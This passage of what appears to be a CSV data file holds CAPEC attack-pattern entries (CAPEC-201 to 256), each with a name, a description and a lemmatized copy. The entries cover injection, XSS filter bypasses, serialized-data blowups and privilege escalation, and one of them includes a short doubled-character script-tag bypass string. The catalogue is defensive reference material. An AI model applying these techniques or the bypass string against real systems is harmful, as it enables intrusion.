mount additional attack insert command datum query target application way prevent filter
CAPEC-201,Serialized Data External Linking,"An adversary creates a serialized data file (e.g. XML, YAML, etc...) that contains an external data reference. Because serialized data parsers may not validate documents with external references, there may be no checks on the nature of the reference in the external data. This can allow an adversary to open arbitrary files or connections, which may further lead to the adversary gaining access to information on the system that they would normally be unable to obtain.",adversary create serialize datum file xml yaml etc contain external datum reference serialize datum parser validate document external reference check nature reference external datum allow adversary open arbitrary file connection lead adversary gain access information system normally unable obtain
CAPEC-202,Create Malicious Client,"An adversary creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures.For example, servers may assume that clients will accurately compute values (such as prices), will send correctly structured messages, and will attempt to ensure efficient interactions with the server. By reverse-engineering a client and creating their own version, an adversary can take advantage of these assumptions to abuse service functionality.For example, a purchasing service might send a unit price to its client and expect the client to correctly compute the total cost of a purchase. If the adversary uses a malicious client, however, the adversary could ignore the server input and declare any total price. Likewise, an adversary could configure the client to retain network or other server resources for longer than legitimately necessary in order to degrade server performance. Even services with general clients can be susceptible to this attack if they assume certain client behaviors. However, such services generally can make fewer assumptions about the behavior of their clients in the first place and, as such, are less likely to make assumptions that an adversary can exploit.",adversary create client application interface target service client violate assumption service make client service designate client application oppose service use general client application imap pop mail server interact imap pop client assume client follow specific procedure example server assume client accurately compute value price send correctly structure message attempt ensure efficient interaction server reverse engineer client create version adversary advantage assumption abuse service functionality example purchase service send unit price client expect client correctly compute total cost purchase adversary use malicious client adversary ignore server input declare total price likewise adversary configure client retain network server resource long legitimately necessary order degrade server performance service general client susceptible attack assume certain client behavior service generally few assumption behavior client place likely assumption adversary exploit
CAPEC-203,Manipulate Registry Information,"An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.",adversary exploit weakness authorization order modify content registry windows registry mac plist application registry edit registry information permit adversary hide configuration information remove indicator compromise cover activity application utilize registry store configuration service information modification registry information affect individual service affect billing authorization allow identity spoofing overall configuration target application example java rmi soap use registry track available service change registry value preliminary step complete attack pattern give long term usage registry value manipulation registry information end
CAPEC-204,Lifting Sensitive Data Embedded in Cache,"An adversary examines a target application's cache, or a browser cache, for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.",adversary examine target application cache browser cache sensitive information application communicate remote entity perform intensive calculation utilize cache improve efficiency application compute receive sensitive information cache appropriately protect attacker browse cache retrieve information result disclosure sensitive information
CAPEC-206,Signing Malicious Code,"The adversary extracts credentials used for code signing from a production environment and then uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the adversary has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the adversary to execute arbitrary code on the victim's computer. This differs from CAPEC-673, because the adversary is performing the code signing.",adversary extract credential code signing production environment use credential sign malicious content developer key developer use signing key sign code hash code user application verify signature accurate lead believe code come owner signing key code modify signature apply adversary extract signing credential use credential sign code bundle user tool verify signature attach code likely assume code come legitimate developer install run code effectively allow adversary execute arbitrary code victim computer differ adversary perform code signing
CAPEC-207,Removing Important Client Functionality,"An adversary removes or disables functionality on the client that the server assumes to be present and trustworthy.Adversaries can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an adversary can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.",adversary remove disable functionality client server assume present trustworthy adversary case logic place guard sensitive functionality datum client application include functionality server rely correct secure operation functionality include limit filter prevent sending dangerous content server logical functionality price calculation authentication logic ensure authorized user utilize client adversary disable functionality client perform action server believe prohibit result client behavior violate assumption server lead variety possible attack example include sending dangerous content script server incorrect price calculation unauthorized access server resource
CAPEC-208,Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements,"An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities.",attacker remove modify logic client associate monetary calculation result incorrect information send server server rely client correctly compute monetary information example server supply price item rely client correctly compute total cost purchase give number item user buy attacker remove modify logic control calculation return incorrect value server attacker use purchase fraction legitimate cost avoid correct billing activity
CAPEC-209,XSS Using MIME Type Mismatch,"An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.",adversary create file script content specify mime type file scripting expect adversary trick victim access url respond script file browser detect specify mime type file match actual type content automatically switch interpreter real content type browser invoke script filter adversary script run target unsanitized possibly reveal victim cookie execute arbitrary script browser
CAPEC-21,Exploitation of Trusted Identifiers,"An adversary guesses, obtains, or ""rides"" a trusted identifier (e.g. session ID, resource ID, cookie, etc.) to perform authorized actions under the guise of an authenticated user or service.Attacks leveraging trusted identifiers typically result in the adversary laterally moving within the local network, since users are often allowed to authenticate to systems/applications within the network using the same identifier. This allows the adversary to obtain sensitive data, download/install malware on the system, pose as a legitimate user for social engineering purposes, and more.Attacks on trusted identifiers take advantage of the fact that some software accepts user input without verifying its authenticity. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes ""trust"" other systems because they are behind a firewall. Similarly, servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Identifiers may be guessed or obtained due to insufficient randomness, poor protection (passed/stored in the clear), lack of integrity (unsigned), or improper correlation with access control policy enforcement points. Exposed configuration and properties files that contain sensitive data may additionally provide an adversary with the information needed to obtain these identifiers. An adversary may also ""ride"" an identifier via a malicious link, as is the case in Cross Site Request Forgery (CSRF) attacks.Regardless of the attack vector, successful spoofing and impersonation of trusted credentials can lead to an adversary breaking authentication, authorization, and audit controls with the target system or application.",adversary guess obtain ride trust identifier session id resource id cookie etc perform authorized action guise authenticate user service attack leverage trust identifier typically result adversary laterally move local network user allow authenticate system application network identifier allow adversary obtain sensitive datum download install malware system pose legitimate user social engineering purpose attack trust identifier advantage fact software accept user input verify authenticity server process vulnerable attack server server communication analyze security perspective process trust system firewall similarly server use easy guess spoofable scheme represent digital identity vulnerable system frequently use scheme cryptography digital signature broken cryptography identifier guess obtain insufficient randomness poor protection pass store clear lack integrity unsigned improper correlation access control policy enforcement point exposed configuration property file contain sensitive datum additionally provide adversary information need obtain identifier adversary ride identifier malicious link case cross site request forgery csrf attack regardless attack vector successful spoofing impersonation trusted credential lead adversary break authentication authorization audit control target system application
CAPEC-212,Functionality Misuse,"An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.",adversary leverage legitimate capability application way achieve negative technical impact system functionality alter modify way intend accomplish overuse specific functionality leverage functionality design flaw enable adversary gain access unauthorized sensitive datum
CAPEC-215,Fuzzing for application mapping,"An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash.By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information. In applications that return a stack trace along with the error, this can enumerate the chain of methods that led up to the point where the error was encountered. This can not only reveal the names of the methods (some of which may have known weaknesses) but possibly also the location of class files and libraries as well as parameter values. In some cases, the stack trace might even disclose sensitive configuration or user information.",attacker send random malformed unexpected message target application observe application log error message return attacker initially know target respond individual message attempt large number message variant find variant trigger desire behavior attack purpose fuzzing observe application log error message fuzze target cause target enter unstable state cause crash observe log error message attacker learn detail configuration target application able cause target disclose sensitive information application return stack trace error enumerate chain method lead point error encounter reveal name method know weakness possibly location class file library parameter value case stack trace disclose sensitive configuration user information
CAPEC-216,Communication Channel Manipulation,"An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.",adversary manipulate setting parameter communication channel order compromise security result information exposure insertion removal information communication stream potentially system compromise
CAPEC-217,Exploiting Incorrectly Configured SSL/TLS,"An adversary takes advantage of incorrectly configured SSL/TLS communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.SSL/TLS communications become vulnerable to this attack when they use outdated versions and insecure ciphers. Currently, all SSL versions are deprecated and TLS versions 1.0 and 1.1 are also deprecated due to being insecure. It is still possible for later versions of TLS to be insecure if they are configured with insecure ciphers such as 3DES or RC4.",adversary take advantage incorrectly configure ssl tls communication enable access datum intend encrypt adversary use type attack inject command traffic encrypt stream cause compromise client server ssl tls communication vulnerable attack use outdated version insecure cipher currently ssl version deprecate tls version deprecate insecure possible later version tls insecure configure insecure cipher
CAPEC-218,Spoofing of UDDI/ebXML Messages,"An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.",attacker spoof uddi ebxml similar message order impersonate service provider e business transaction uddi ebxml similar standard identify business e business transaction thing identify particular participant wsdl information soap transaction support communication protocol include security protocol spoof message attacker impersonate legitimate business transaction manipulate protocol client business result disclosure sensitive information loss message integrity financial fraud
CAPEC-219,XML Routing Detour Attacks,"An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Adversary in the Middle type attacks (CAPEC-94). The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of their choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.",attacker subvert intermediate system process xml content force intermediate modify route processing content xml routing detour attack adversary middle type attack attacker compromise insert intermediate system processing xml message example ws routing specify series node intermediary content pass intermediate node route compromise attacker routing detour attack compromised system attacker able route xml process node choice modify response normal chain processing unaware interception system forward message outside entity hide forwarding processing legitimate processing system alter header information
CAPEC-22,Exploiting Trust in Client,"An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.",attack type exploit vulnerability client server communication channel authentication data integrity leverage implicit trust server place client importantly server believe client attacker execute type attack communicate directly server server believe communicate valid client numerous variation type attack
CAPEC-220,Client-Server Protocol Manipulation,"An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions.For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.",adversary take advantage weakness protocol client server communicate perform unexpected action communication protocol necessary transfer message client server application different protocol different type interaction example authentication protocol establish identity server client separate messaging protocol exchange datum weakness protocol client server attacker advantage perform type attack example attacker able manipulate authentication protocol attacker able spoof client server attacker able manipulate messaging protocol able read sensitive information modify message content attack easy fact client server support multiple protocol perform similar role example server support different authentication protocol order support wide range client include legacy client old protocol vulnerability allow attacker manipulate client server interaction
CAPEC-221,Data Serialization External Entities Blowup,"This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.",attack take advantage entity replacement property certain datum serialization language xml yaml etc value replacement uri craft file entity refer uri consume large resource create denial service condition cause system freeze crash execute arbitrary code depend uri
CAPEC-222,iFrame Overlay,"In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system.While being logged in to some target system, the victim visits the adversarys' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the adversary wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the adversary may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks they are clicking on versus what they are actually clicking on.",iframe overlay attack victim trick unknowingly initiate action system interact ui seemingly completely different system log target system victim visit adversarys malicious site display ui victim wish interact reality iframe overlay page transparent layer visible ui action control adversary wish victim execute victim click button ui element page actually trigger action control transparent overlay layer depend action control adversary trick victim execute potentially privileged undesired functionality target system victim authenticate basic problem dichotomy victim think click versus actually click
CAPEC-224,Fingerprinting,"An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Most commonly, fingerprinting is done to determine operating system and application versions. Fingerprinting can be done passively as well as actively. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.",adversary compare output target system know indicator uniquely identify specific detail target commonly fingerprinting determine operating system application version fingerprinting passively actively fingerprinting usually detrimental target information gather fingerprinting enable adversary discover exist weakness target
CAPEC-226,Session Credential Falsification through Manipulation,"An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server.For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.",attacker manipulate exist credential order gain access target application session credential allow user identify service initial authentication need resend authentication information usually username password message attacker able manipulate credential sniff exist connection order gain access target server example credential form web cookie field indicate access right user manually tweak cookie user able increase access right server alternately attacker able manipulate exist credential appear different user attack differ falsification prediction user base modify credential exist credential instead pattern detect prior credential create new credential accept fit pattern result attacker able impersonate user elevate permission target service
CAPEC-227,Sustained Client Engagement,"An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource.The degree to which the attack is successful depends upon the adversary's ability to sustain resource requests over time with a volume that exceeds the normal usage by legitimate users, as well as other mitigating circumstances such as the target's ability to shift load or acquire additional resources to deal with the depletion. This attack differs from a flooding attack as it is not entirely dependent upon large volumes of requests, and it differs from resource leak exposures which tend to exploit the surrounding environment needed for the resource to function. The key factor in a sustainment attack are the repeated requests that take longer to process than usual.",adversary attempt deny legitimate user access resource continually engage specific resource attempt resource tie long possible adversary primary goal crash flood target alert defender repeatedly perform action abuse algorithmic flaw give resource tie available legitimate user carefully craft request resource engage seemingly benign request legitimate user limit completely deny access resource degree attack successful depend adversary ability sustain resource request time volume exceed normal usage legitimate user mitigate circumstance target ability shift load acquire additional resource deal depletion attack differ flooding attack entirely dependent large volume request differ resource leak exposure tend exploit surround environment need resource function key factor sustainment attack repeat request long process usual
CAPEC-228,DTD Injection,"An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.",attacker inject malicious content application dtd attempt produce negative technical impact dtd describe xml document process certain malformed dtd example excessive entity expansion describe capec cause xml parser process dtd consume excessive resource result resource depletion
CAPEC-229,Serialized Data Parameter Blowup,"This attack exploits certain serialized data parsers (e.g., XML, YAML, etc.) which manage data in an inefficient manner. The attacker crafts an serialized data file with multiple configuration parameters in the same dataset. In a vulnerable parser, this results in a denial of service condition where CPU resources are exhausted because of the parsing algorithm. The weakness being exploited is tied to parser implementation and not language specific.",attack exploit certain serialize datum parser xml yaml etc manage datum inefficient manner attacker craft serialize datum file multiple configuration parameter dataset vulnerable parser result denial service condition cpu resource exhaust parsing algorithm weakness exploit tie parser implementation language specific
CAPEC-23,File Content Injection,"An adversary poisons files with a malicious payload (targeting the file systems accessible by the target software), which may be passed through by standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes, in order to exploit the host's trust in executing remote content, including binary files.Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:\Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.",adversary poison file malicious payload target file system accessible target software pass standard channel email standard web content like pdf multimedia file adversary exploit know vulnerability handling routine target process order exploit host trust execute remote content include binary file vulnerability type find wide variety commercial application microsoft office adobe acrobat apple safari web browser adversary know standard handling routine identify vulnerability entry point exploit seemingly normal content attack execute adversary program access relative directory files standard system directory launch attack bad case scenario program combine propagation logic work virus
CAPEC-230,Serialized Data with Nested Payloads,"Applications often need to transform data in and out of a data format (e.g., XML and YAML) by using a parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. By nesting these structures, causing the data to be repeatedly substituted, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization.An adversary's goal is to leverage parser failure to their advantage. In most cases this type of an attack will result in a Denial of Service due to an application becoming unstable, freezing, or crashing. However it may be possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [REF-89].This attack is most closely associated with web services using SOAP or a Rest API, because remote service requesters can post malicious payloads to the service provider. The main weakness is that the service provider generally must inspect, parse, and validate the messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that this attack targets. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.",application need transform datum data format xml yaml parser possible adversary inject datum adverse effect parser process data format language allow definition macro like structure simplify creation complex structure nest structure cause datum repeatedly substitute adversary cause parser consume resource process cause excessive memory consumption cpu utilization adversary goal leverage parser failure advantage case type attack result denial service application unstable freeze crash possible cause crash result arbitrary code execution lead jump data plane control plane attack closely associate web service soap rest api remote service requester post malicious payload service provider main weakness service provider generally inspect parse validate message determine routing workflow security consideration exactly inspection parsing validation routine attack target attack exploit loosely couple nature web service service provider little control service requester message service requester send
CAPEC-231,Oversized Serialized Data Payloads,"An adversary injects oversized serialized data payloads into a parser during data processing to produce adverse effects upon the parser such as exhausting system resources and arbitrary code execution.Applications often need to transform data in and out of serialized data formats, such as XML and YAML, by using a data parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. By supplying oversized payloads in input vectors that will be processed by the parser, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization, and potentially cause execution of arbitrary code. An adversary's goal is to leverage parser failure to their advantage. DoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious data payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.",adversary inject oversized serialize datum payload parser datum processing produce adverse effect parser exhaust system resource arbitrary code execution application need transform datum serialized data format xml yaml datum parser possible adversary inject datum adverse effect parser process supply oversized payload input vector process parser adversary cause parser consume resource process cause excessive memory consumption cpu utilization potentially cause execution arbitrary code adversary goal leverage parser failure advantage dos closely associate web service soap rest remote service requester post malicious datum payload service provider design exhaust service provider memory cpu disk space attack exploit loosely couple nature web service service provider little control service requester message service requester send
CAPEC-233,Privilege Escalation,An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.,adversary exploit weakness enable elevate privilege perform action suppose authorize perform
CAPEC-234,Hijacking a privileged process,"An adversary gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code.",adversary gain control process assign elevated privilege order execute arbitrary code privilege process assign elevated privilege operate system usually association particular user group role attacker hijack process able assume level privilege order execute code
CAPEC-237,Escaping a Sandbox by Calling Code in Another Language,"The attacker may submit malicious code of another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behalf. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.",attacker submit malicious code language obtain access privilege intentionally expose sandbox escape sandbox instance java code perform unsafe operation modify arbitrary memory location restriction place byte code verifier jvm allow java code directly native c code perform unsafe operation system call modify arbitrary memory location behalf provide isolation java grant untrusted code unmediated access native c code instead sandboxed code typically allow subset pre exist native code standard library
CAPEC-24,Filter Failure through Buffer Overflow,"In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).",attack idea cause active filter fail cause oversized transaction attacker try feed overly long input string program attempt overwhelm filter cause buffer overflow hope filter fail securely user input let system unfiltered
CAPEC-240,Resource Injection,An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.,adversary exploit weakness input validation manipulate resource identifier enable unintended modification specification resource
CAPEC-242,Code Injection,"An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.",adversary exploit weakness input validation target inject new code currently execute differ code inclusion code inclusion involve addition replacement reference code file subsequently load target code application
CAPEC-243,XSS Targeting HTML Attributes,"An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.",adversary insert command perform cross site scripting xss action html attribute filter adequately sanitize attribute presence potentially dangerous command adequately sanitize tag example dangerous expression insert style attribute anchor tag result execution malicious code result page render victim trick view render page attack proceed like normal xss attack possibly result loss sensitive cookie malicious activity
CAPEC-244,XSS Targeting URI Placeholders,"An attack of this type exploits the ability of most browsers to interpret ""data"", ""javascript"" or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.",attack type exploit ability browser interpret datum javascript uri scheme client executable content placeholder attack consist pass malicious uri anchor tag href attribute similar attribute html tag malicious uri contain example encode html content embed cross site scripting payload attack execute browser interpret malicious content example victim click malicious link
CAPEC-245,XSS Using Doubled Characters,"The adversary bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the adversary can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.",adversary bypass input validation double character order perform cross site scripting attack filter fail recognize dangerous sequence precede repeat character example double script command script uri encoding filter web application fail recognize presence script tag target server vulnerable type bypass adversary create craft url trap cause victim view page target server malicious content execute normal xss attack
CAPEC-247,XSS Using Invalid Characters,"An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the adversary to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.",adversary insert invalid character identifier bypass application filtering input filter scan invalid character later stage process content follow invalid character process allow adversary sneak prohibited command past filter perform normally prohibit operation invalid character include null carriage return line feed tab identifier successful bypassing filter result xss attack result disclosure web cookie possibly result
CAPEC-248,Command Injection,"An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.",adversary look execute command choosing inject new item exist command modify interpretation away intend command context standalone string interpret downstream component cause specific response type attack possible untrusted value build command string weakness input validation command construction enable attack lead successful exploitation
CAPEC-25,Forced Deadlock,"The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.",adversary trigger exploit deadlock condition target software cause denial service deadlock occur compete action wait finish deadlock condition difficult detect
CAPEC-250,XML Injection,"An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.",attacker utilize craft xml user controllable input probe attack inject datum xml database technique similar sql injection user controllable input allow unauthorized viewing datum bypass authentication end application direct xml database access possibly alter database information
CAPEC-251,Local Code Inclusion,"The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.",attacker force application load arbitrary code file local machine attacker use try load old version library file know vulnerability load file attacker place local machine prior attack change functionality target application unexpected way
CAPEC-252,PHP Local File Inclusion,"The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.",attacker load execute arbitrary local php file target machine attacker use try load old version php file know vulnerability load php file attacker place local machine prior attack change functionality target application unexpected way
CAPEC-253,Remote Code Inclusion,"The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.",attacker force application load arbitrary code file remote location attacker use try load old version library file know vulnerability load malicious file attacker place remote machine change functionality target application unexpected way
CAPEC-256,SOAP Array Overflow,"An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array.",attacker send soap request array actual length exceed length indicate request server process transmission naively trust specify size attacker intentionally understate size array possibly result buffer overflow server attempt read entire data set memory allocate small array
